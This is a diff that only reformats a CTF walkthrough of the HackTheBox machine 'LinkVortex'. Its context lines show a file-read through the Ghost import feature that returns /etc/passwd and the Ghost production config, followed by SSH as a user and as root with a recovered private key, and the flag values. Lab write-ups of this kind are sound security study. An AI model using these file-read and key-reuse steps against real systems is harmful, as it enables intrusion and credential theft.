@@ -101,7 +101,7 @@
   - Go to Settings > Labs > Import Content
 
 - **Request the file**
-  - `curl http://linkvortex.htb/content/images/test-file.png`
+  - Command: `curl http://linkvortex.htb/content/images/test-file.png`
   - Output:
     ```
     root:x:0:0:root:/root:/bin/bash
@@ -122,7 +122,7 @@
     #GHOST ENDPOINT
     GHOST_URL='http://linkvortex.htb'
     ```
-- Prompt to read the file at `/var/lib/ghost/config.production.json`
+- **Prompt to read the file at `/var/lib/ghost/config.production.json`**
   - Output:
     ```
     file> /var/lib/ghost/config.production.json
@@ -135,10 +135,10 @@
     }
     <...SNIP...>
     ```
-- SSH
+- **SSH**
   - Commnad `ssh bob@linkvortex.htb`
 
-- User Flag obtained
+- **User Flag obtained**
   - Flag : 62b09350943fdbc28d07e178eb7a277d
 
 ---
@@ -203,12 +203,12 @@
     -----END OPENSSH PRIVATE KEY-----
     ```
 
-- SSH as root
+- **SSH as root**
   - Copy the private key to root
   - `chmod 600 root`
   - `ssh -i root root@linkvortex.htb`
 
-- Root Flag obtained
+- **Root Flag obtained**
   - Flag : fd42da09a7da1b29d7ed33cbfd983d71
 ---
 
